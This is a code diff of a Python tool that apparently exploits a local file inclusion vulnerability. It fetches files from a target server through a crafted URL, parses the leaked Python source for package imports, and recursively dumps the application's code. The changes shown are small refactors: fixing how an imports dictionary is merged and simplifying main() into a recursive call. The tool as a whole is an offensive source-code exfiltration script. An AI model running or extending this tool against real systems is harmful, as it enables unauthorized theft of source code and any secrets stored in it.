@@ -6,7 +6,6 @@ from argparse import ArgumentParser
 
 
 def leak_file(file_path: str | Path):
-    
     res = requests.get(LFI_URL + file_path, headers=HEADERS)
     if res.status_code != 200:
         return None
@@ -27,7 +26,7 @@ def parse_imports(file_path):
         if isinstance(node, ast.ImportFrom):
             module = node.module
             if module is not None and PACKAGE_NAME in module:
-                imports[module] = []
+                imports[module] = imports[module] if module in imports else []
                 for alias in node.names:
                     imports[module].append(alias.name)
         elif isinstance(node, ast.Import):
@@ -77,12 +76,7 @@ def format_path(path: str):
 def main():
     if not root.exists():
         os.mkdir(root)
-    path = leak_file(MAIN_FILE)
-    imports = parse_imports(path)
-    paths = convert_imports(imports)
-    for p in paths:
-        file_path = format_path(p)
-        run_recurse(file_path)
+    run_recurse(MAIN_FILE)
 
 def headers(string: str):
     split = string.split(":")
